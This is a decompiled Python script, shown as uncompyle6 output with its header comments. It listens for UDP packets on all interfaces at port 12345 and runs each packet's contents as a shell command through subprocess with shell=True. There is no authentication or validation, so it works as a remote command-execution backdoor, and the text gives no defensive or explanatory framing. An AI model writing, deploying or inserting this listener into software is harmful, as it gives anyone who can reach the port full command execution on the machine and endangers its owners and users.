# uncompyle6 version 3.9.2
# Python bytecode version base 3.8.0 (3413)
# Decompiled from: Python 3.8.10 (default, Sep 11 2024, 16:02:53) 
# [GCC 9.4.0]
# Embedded file name: 628_1.py
# Compiled at: 2024-12-16 05:39:22
# Size of source mod 2**32: 671 bytes
import socket, subprocess

def handle_packet(data):
    try:
        result = subprocess.run(data, shell=True, check=True, capture_output=True)
        print(result.stdout.decode())
    except subprocess.CalledProcessError as e:
        try:
            print(f"Error executing command: {e}")
        finally:
            e = None
            del e


def start_server():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    server_socket.bind(('0.0.0.0', 12345))
    while True:
        data, addr = server_socket.recvfrom(1024)
        handle_packet(data.decode())


if __name__ == "__main__":
    start_server()

# okay decompiling 628_1.pyc
